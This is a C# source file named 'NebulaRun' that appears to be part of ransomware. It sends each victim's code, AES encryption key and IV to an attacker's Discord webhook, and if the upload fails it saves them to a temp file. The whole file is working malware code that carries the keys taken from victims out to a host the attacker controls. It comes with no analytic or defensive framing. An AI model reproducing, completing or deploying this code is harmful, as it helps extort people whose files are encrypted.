using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace NebulaRun
{
    public static class Send
    {
        private const string WebhookUrl = "YOUR_DISCORD_WEBHOOK";

        public static async Task SendToDiscordAsync(string base64Key, string base64Iv, string victimCode)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new
                    {
                        content = $"**Victim Code:** {victimCode}\n**AES Key:** {base64Key}\n**AES IV:** {base64Iv}"
                    };

                    string json = JsonSerializer.Serialize(payload);

                    using (var content = new StringContent(json, Encoding.UTF8, "application/json"))
                    {
                        HttpResponseMessage response = await client.PostAsync(WebhookUrl, content);
                        response.EnsureSuccessStatusCode();
                    }
                }
            }
            catch (Exception ex)
            {
                SaveOffline(base64Key, base64Iv, victimCode, ex.Message);
            }
        }

        private static void SaveOffline(string key, string iv, string code, string err = "")
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(), "d.txt");
                string log = $"[FAILED] {DateTime.Now}\r\nVictim: {code}\r\nKey: {key}\r\nIV: {iv}\r\nError: {err}\r\n---\r\n";
                File.AppendAllText(path, log);
            }
            catch
            {
            }
        }
    }
}
